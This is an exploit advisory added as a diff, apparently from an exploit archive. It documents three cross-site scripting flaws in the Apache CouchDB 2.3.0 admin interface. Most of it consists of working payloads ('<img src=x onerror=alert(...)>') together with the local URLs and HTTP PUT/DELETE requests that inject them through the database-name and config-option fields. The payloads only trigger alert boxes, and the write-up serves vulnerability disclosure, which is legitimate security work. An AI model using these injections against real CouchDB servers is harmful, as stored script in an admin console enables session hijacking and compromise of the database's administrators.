@@ -1,0 +1,64 @@
+##################################################################################################################################
+# Exploit Title: Apache CouchDB 2.3.0 | Cross-Site Scripting
+# Date: 17.02.2019
+# Exploit Author: Ozer Goker
+# Vendor Homepage: http://couchdb.apache.org
+# Software Link: http://couchdb.apache.org/#download
+# Version: 2.3.0
+##################################################################################################################################
+
+Introduction
+
+A CouchDB server hosts named databases, which store documents. Each
+document is uniquely named in the database, and CouchDB provides a RESTful
+HTTP API for reading and updating (add, edit, delete) database documents.
+
+#################################################################################
+
+XSS details: DOM Based & Reflected & Stored
+
+#################################################################################
+
+XSS1 | DOM Based - Create Database
+
+URL
+http://127.0.0.1:5984/_utils/#/_all_dbs
+
+
+PAYLOAD
+<img src=x onerror=alert(1)>
+
+<input id="js-new-database-name" type="text" class="input-xxlarge"
+placeholder="Name of database" value="<img src=x onerror=alert(1)>">
+
+#################################################################################
+
+XSS2 | DOM Based & Stored - Add Option
+
+URL
+http://127.0.0.1:5984/_utils/#_config/couchdb@localhost
+http://127.0.0.1:5984/_node/couchdb@localhost/_config/1/%3Cimg%20src%3Dx%20onerror%3Dalert(2)%3E
+
+METHOD
+Put
+
+PAYLOAD
+<img src=x onerror=alert(2)>
+
+<input class="input-option-name" type="text" name="name" placeholder="Name">
+
+#################################################################################
+
+XSS3 | DOM Based & Stored - Delete Option
+
+URL
+http://127.0.0.1:5984/_utils/#_config/couchdb@localhost
+http://127.0.0.1:5984/_node/couchdb@localhost/_config/1/%3Cimg%20src%3Dx%20onerror%3Dalert(2)%3E
+
+METHOD
+Delete
+
+PAYLOAD
+<img src=x onerror=alert(2)>
+
+#################################################################################
